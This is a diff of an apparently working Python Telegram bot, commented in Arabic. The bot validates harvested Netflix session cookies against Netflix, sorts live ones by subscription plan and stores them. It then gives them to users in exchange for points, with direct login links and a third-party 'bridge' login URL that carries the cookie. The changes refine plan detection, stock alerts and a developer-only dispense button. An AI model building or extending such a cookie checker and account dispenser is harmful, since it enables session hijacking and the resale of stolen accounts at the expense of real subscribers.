@@ -38,7 +38,7 @@ if not os.path.exists(BASE_TEMP_DIR):
 active_scans = {}
 
 # ====================================================
-# ✅ قاعدة البيانات المحدثة لدعم الفئات، اللغات، والتنبيهات
+# ✅ قاعدة البيانات المحدثة والمحمية من التداخل
 # ====================================================
 DB_DIR = "database"
 if not os.path.exists(DB_DIR):
@@ -63,14 +63,11 @@ def db_execute(query, params=(), fetch=False, fetchall=False):
         return res
 
 def load_all_data():
-    # إضافة حقل اللغة لقاعدة البيانات الافتراضية ar
     db_execute('''CREATE TABLE IF NOT EXISTS users (chat_id INTEGER PRIMARY KEY, points INTEGER, username TEXT, role TEXT, lang TEXT DEFAULT 'ar')''')
-    # إضافة حقل الفئة للكوكيز المتوفرة (BASIC, STANDARD, PREMIUM)
     db_execute('''CREATE TABLE IF NOT EXISTS cookies (cookie TEXT PRIMARY KEY, plan TEXT DEFAULT 'PREMIUM')''')
     db_execute('''CREATE TABLE IF NOT EXISTS history (cookie TEXT PRIMARY KEY)''')
     db_execute('''CREATE TABLE IF NOT EXISTS banned (chat_id INTEGER PRIMARY KEY)''')
     db_execute('''CREATE TABLE IF NOT EXISTS temp_files (id INTEGER PRIMARY KEY AUTOINCREMENT, file_path TEXT, original_name TEXT)''')
-    # جدول نظام التنبيهات للشحن
     db_execute('''CREATE TABLE IF NOT EXISTS stock_alerts (chat_id INTEGER PRIMARY KEY, plan TEXT)''')
     print("✅ تم تحديث وتجهيز قاعدة البيانات بنجاح!")
 
@@ -196,6 +193,9 @@ def extract_clean_netflix_ids(text):
             cleaned_ids.append(decoded)
     return cleaned_ids
 
+# ====================================================
+# 🔥 تحديث دالة الفحص لضمان فلترة وتحديد الفئات بدقة عالية
+# ====================================================
 def check_netflix_cookie_detailed(netflix_id):
     headers = dict(BASE_HEADERS)
     headers["Cookie"] = f"NetflixId={netflix_id}"
@@ -204,17 +204,24 @@ def check_netflix_cookie_detailed(netflix_id):
         if response.status_code == 200:
             data = response.json()
             value_data = data.get("value", {})
+            
+            # محاولة قراءة جودة الفيديو أو الخطة المتاحة في ملف الاستجابة
+            video_quality = str(value_data.get("videoQuality", "")).upper()
+            raw_response_text = json.dumps(data).upper() if 'json' in response.headers.get('Content-Type', '') else response.text.upper()
+            
+            plan_type = "PREMIUM" # الفئة الافتراضية
+            
+            # الفلترة الدقيقة بناء على جودة الـ Stream أو مسميات الخطط داخل الجيسون المرتجع
+            if "BASIC" in video_quality or "SD" in video_quality or "BASIC" in raw_response_text:
+                plan_type = "BASIC"
+            elif "STANDARD" in video_quality or "HD" in video_quality or "STANDARD" in raw_response_text:
+                plan_type = "STANDARD"
+            elif "PREMIUM" in video_quality or "UHD" in video_quality or "4K" in raw_response_text:
+                plan_type = "PREMIUM"
+
             account_info = value_data.get("account", {}).get("token", {}).get("default", {})
             token = account_info.get("token")
             expires = account_info.get("expires")
-            
-            # 🔍 فحص واستخراج خطة الحساب الذكية تلقائياً من الـ API لبثها في الفئات
-            video_quality = str(value_data.get("videoQuality", "PREMIUM")).upper()
-            plan_type = "PREMIUM"
-            if "BASIC" in video_quality:
-                plan_type = "BASIC"
-            elif "STANDARD" in video_quality:
-                plan_type = "STANDARD"
                 
             if token:
                 membership_status = value_data.get("membershipStatus", "UNKNOWN")
@@ -231,7 +238,6 @@ def check_netflix_cookie_detailed(netflix_id):
     except Exception:
         return None
 
-# دالة ذكية لإرسال تنبيهات شحن المخزن فوراً في الخلفية
 def trigger_stock_alert_notifications(plan_name):
     alerts = db_execute("SELECT chat_id FROM stock_alerts WHERE plan=?", (plan_name,), fetchall=True)
     if alerts:
@@ -274,7 +280,7 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
     clean_source_name = source_name.replace("_", "\\_").replace("*", "\\*").replace("`", "\\`").replace("[", "\\[")
     live_accounts_accumulator = []
     stop_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 إيقاف الفحص", callback_data=f"stop_scan_{chat_id}"))
-    status = bot.send_message(chat_id, f"⏳ جاري فحص واستخراج الكوكيز...\n\n(تم العثور على {total_count} كوكيز وجاري المعالجة...)", reply_to_message_id=reply_to_message_id, reply_markup=stop_markup)
+    status = bot.send_message(chat_id, f"⏳ جاري فحص واستخراج الكوكيز وتصنيف الفئات...\n\n(تم العثور على {total_count} كوكيز وجاري المعالجة...)", reply_to_message_id=reply_to_message_id, reply_markup=stop_markup)
     live_count, dead_count, dup_count = 0, 0, 0
     newly_added_plans = set()
     
@@ -287,7 +293,7 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
         
         if index % 5 == 0 or index == total_count:
             try:
-                bot.edit_message_text(f"⏳ جاري الفحص: ({index}/{total_count})\n✅ شغال: {live_count} | ❌ ميت: {dead_count} | ✂️ مكرر: {dup_count}", chat_id, status.message_id, reply_markup=stop_markup)
+                bot.edit_message_text(f"⏳ جاري الفحص والفرز: ({index}/{total_count})\n✅ شغال: {live_count} | ❌ ميت: {dead_count} | ✂️ مكرر: {dup_count}", chat_id, status.message_id, reply_markup=stop_markup)
             except Exception:
                 pass
                 
@@ -300,7 +306,8 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
                 live_count += 1
                 newly_added_plans.add(plan_detected)
                 db_execute("INSERT OR IGNORE INTO history (cookie) VALUES (?)", (netflix_id,))
-                db_execute("INSERT OR IGNORE INTO cookies (cookie, plan) VALUES (?, ?)", (netflix_id, plan_detected))
+                # حفظ الفئة المصنفة بشكل صحيح هنا
+                db_execute("INSERT OR REPLACE INTO cookies (cookie, plan) VALUES (?, ?)", (netflix_id, plan_detected))
                 
             token = result["token"]
             expires = result["expires"]
@@ -313,7 +320,7 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
             chosen_host = random.choice(api_hosts)
             bridge_login_url = f"{chosen_host}/nf/netflix?cookie={encoded_cookie}"
             dup_tag = " (مكرر شغال)" if is_duplicate else ""
-            res_text = f"🌟 **{plan_detected} ACCOUNT{dup_tag}** 🌟\n\n📁 المصدر: {clean_source_name}\n• انتهاء الفواتير: {date_str}\n\n🔗 الرابط المباشر:\n{direct_netflix_url}"
+            res_text = f"🌟 **{plan_detected} ACCOUNT{dup_tag}** 🌟\n\n📁 المصدر: {clean_source_name}\n• الفئة المصنفة: *{plan_detected}*\n• انتهاء الفواتير: {date_str}\n\n🔗 الرابط المباشر:\n{direct_netflix_url}"
             txt_entry = f"Cookie: {full_cookie_string}\nPlan: {plan_detected}\nURL: {direct_netflix_url}\n====================\n\n"
             live_accounts_accumulator.append(txt_entry)
             markup = InlineKeyboardMarkup().add(InlineKeyboardButton("💻 PC Login", url=direct_netflix_url), InlineKeyboardButton("📱 Phone Login", url=bridge_login_url))
@@ -328,11 +335,10 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
         
     active_scans.pop(chat_id, None)
     current_points = db_execute("SELECT points FROM users WHERE chat_id=?", (chat_id,), fetch=True)[0]
-    safe_send_message(chat_id, f"📊 **اكتمل الفحص والتصفية!**\n\n✅ المضاف للمخزن الجديد: {live_count}\n❌ التالف: {dead_count}\n✂️ المكرر الشغال المرسل: {dup_count}\n\n🪙 رصيدك الحالي: {current_points} نقطة 🪙")
+    safe_send_message(chat_id, f"📊 **اكتمل الفحص والتصفية حسب الفئة!**\n\n✅ المضاف للمخزن الجديد: {live_count}\n❌ التالف: {dead_count}\n✂️ المكرر الشغال المرسل: {dup_count}\n\n🪙 رصيدك الحالي: {current_points} نقطة 🪙")
     if live_accounts_accumulator:
         send_txt_file(chat_id, live_accounts_accumulator, source_name)
         
-    # إطلاق التنبيهات تلقائياً إذا شُحنت الفئات المطلوبة من قبل فارس
     for plan in newly_added_plans:
         threading.Thread(target=trigger_stock_alert_notifications, args=(plan,), daemon=True).start()
 
@@ -350,7 +356,7 @@ def send_txt_file(chat_id, accounts_list, original_filename):
             for item in accounts_list:
                 f.write(item)
         with open(output_txt_path, 'rb') as doc:
-            bot.send_document(chat_id, doc, caption="📁 ملف الحسابات الشغالة المجمعة الخريجة من الفحص الحالي 🔥")
+            bot.send_document(chat_id, doc, caption="📁 ملف الحسابات الشغالة المجمعة والمنظمة حسب الفئة 🔥")
         if os.path.exists(output_txt_path):
             os.remove(output_txt_path)
     except Exception as e:
@@ -366,10 +372,14 @@ def generate_main_keyboard(user_id):
 
     markup = InlineKeyboardMarkup()
     markup.row_width = 1
+    
     markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_check"], callback_data="menu_check"))
     
-    # زر السحب الذكي المترجم
-    markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_dispense"], callback_data="menu_dispense_plans"))
+    if user_id == DEVELOPER_CHAT_ID:
+        dispense_text = "🎁 سحب رابط نتفلكس (صلاحية المطور ♾️)" if lang == "ar" else "🎁 Dispense Netflix (Dev Mode ♾️)"
+        markup.add(InlineKeyboardButton(dispense_text, callback_data="menu_dispense_plans"))
+    else:
+        markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_dispense"], callback_data="menu_dispense_plans"))
     
     markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_pool"], callback_data="check_pool_status"))
     markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_faq"], callback_data="open_faq_section"))
@@ -377,29 +387,25 @@ def generate_main_keyboard(user_id):
     
     if user_id == DEVELOPER_CHAT_ID:
         markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_admin"], callback_data="open_admin_panel"))
+        
     return markup
 
 @bot.message_handler(commands=['start'])
 @check_ban
 def send_welcome(message):
     chat_id = message.chat.id
-    is_new = db_execute("SELECT 1 FROM users WHERE chat_id=?", (chat_id,), fetch=True) is None
     ensure_user(chat_id, message.from_user.username or "")
     lang = get_user_lang(chat_id)
-    
-    welcome_txt = LANG_DICT[lang]["welcome_new"] if is_new else LANG_DICT[lang]["welcome_back"]
-    bot.reply_to(message, welcome_txt, reply_markup=generate_main_keyboard(chat_id))
+    keyboard = generate_main_keyboard(chat_id)
+    welcome_txt = LANG_DICT[lang]["welcome_back"]
+    bot.send_message(chat_id, welcome_txt, reply_markup=keyboard)
 
-# ====================================================
-# 🗂️ نظام تقسيم المخزن إلى فئات والتنبيهات المترجم
-# ====================================================
 @bot.callback_query_handler(func=lambda call: call.data == "menu_dispense_plans")
 @check_ban
 def show_plans_menu(call):
     chat_id = call.message.chat.id
     lang = get_user_lang(chat_id)
     
-    # جلب الإحصائيات اللحظية لكل فئة
     p_count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan='PREMIUM'", fetch=True)[0]
     s_count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan='STANDARD'", fetch=True)[0]
     b_count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan='BASIC'", fetch=True)[0]
@@ -407,7 +413,6 @@ def show_plans_menu(call):
     markup = InlineKeyboardMarkup()
     markup.row_width = 1
     
-    # صياغة أزرار الفئات مع السعر والعدد المتوفر ديناميكياً
     p_text = f"💎 Premium ({LANG_DICT[lang]['plan_cost']}: 3 {LANG_DICT[lang]['points_unit']}) [{LANG_DICT[lang]['available']}: {p_count}]"
     s_text = f"✨ Standard ({LANG_DICT[lang]['plan_cost']}: 2 {LANG_DICT[lang]['points_unit']}) [{LANG_DICT[lang]['available']}: {s_count}]"
     b_text = f"⚙️ Basic ({LANG_DICT[lang]['plan_cost']}: 1 {LANG_DICT[lang]['point_unit']}) [{LANG_DICT[lang]['available']}: {b_count}]"
@@ -439,7 +444,6 @@ def handle_pull_account_category(call):
         
     count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan=?", (plan_target,), fetch=True)[0]
     if count == 0:
-        # المخزن فارغ! يظهر زر "🔔 نبهني عند التعبئة" فوراً
         bot.answer_callback_query(call.id, LANG_DICT[lang]["empty_stock"].format(plan=plan_target), show_alert=False)
         markup = InlineKeyboardMarkup().add(InlineKeyboardButton(LANG_DICT[lang]["btn_alert"], callback_data=f"activate_alert_{plan_target}"))
         bot.edit_message_text(LANG_DICT[lang]["empty_stock"].format(plan=plan_target), chat_id, call.message.message_id, reply_markup=markup)
@@ -460,7 +464,6 @@ def handle_pull_account_category(call):
                 db_execute("UPDATE users SET points = points - ? WHERE chat_id=?", (cost, chat_id))
                 points -= cost
             
-            db_execute("INSERT INTO cookies (cookie, plan) VALUES (?, ?)", (current_cookie, plan_target))
             token = fresh_result["token"]
             expires = fresh_result["expires"]
             if isinstance(expires, int) and len(str(expires)) == 13:
@@ -497,12 +500,8 @@ def save_stock_alert_request(call):
     
     db_execute("INSERT OR IGNORE INTO stock_alerts (chat_id, plan) VALUES (?, ?)", (chat_id, plan_target))
     bot.answer_callback_query(call.id, LANG_DICT[lang]["alert_saved"], show_alert=True)
-    # العودة للوحة الرئيسية
     bot.edit_message_text(LANG_DICT[lang]["welcome_back"], chat_id, call.message.message_id, reply_markup=generate_main_keyboard(chat_id))
 
-# ====================================================
-# 🌐 نظام تغيير اللغة الذكي
-# ====================================================
 @bot.callback_query_handler(func=lambda call: call.data == "toggle_language")
 def switch_user_language(call):
     chat_id = call.message.chat.id
@@ -511,13 +510,8 @@ def switch_user_language(call):
     
     db_execute("UPDATE users SET lang=? WHERE chat_id=?", (new_lang, chat_id))
     bot.answer_callback_query(call.id, "🌐 Done / تم تغيير اللغة بنجاح!")
-    
-    # تحديث الواجهة فورياً باللغة الجديدة
     bot.edit_message_text(LANG_DICT[new_lang]["welcome_back"], chat_id, call.message.message_id, reply_markup=generate_main_keyboard(chat_id))
 
-# ====================================================
-# 💡 قسم الأسئلة الشائعة والمساعدة التفاعلي (FAQ)
-# ====================================================
 @bot.callback_query_handler(func=lambda call: call.data == "open_faq_section")
 @check_ban
 def faq_menu_handler(call):
@@ -549,8 +543,6 @@ def faq_back_button(call):
     chat_id = call.message.chat.id
     lang = get_user_lang(chat_id)
     bot.edit_message_text(LANG_DICT[lang]["welcome_back"], chat_id, call.message.message_id, reply_markup=generate_main_keyboard(chat_id))
-
-# ====================================================
 
 @bot.message_handler(commands=['id'])
 @check_ban
@@ -836,10 +828,11 @@ def handle_stop_scan(call):
         active_scans[target_chat_id] = False
         bot.answer_callback_query(call.id, "🛑 جاري إيقاف عملية الفحص الحالية...")
 
+import json # تم استدعاء json لفك الردود المعقدة للـ API بدقة
 if __name__ == '__main__':
     while True:
         try:
-            print("🚀 البوت يعمل بكافة المزايا الذكية المترجمة وبنظام الفئات الحصري...")
+            print("🚀 البوت يعمل الآن مع فلترة وتصنيف دقيق للمخزن حسب الفئات (Premium/Standard/Basic)...")
             bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
         except Exception as e:
             print(f"⚠️ حدث خطأ في اتصال تيليجرام: {e}")
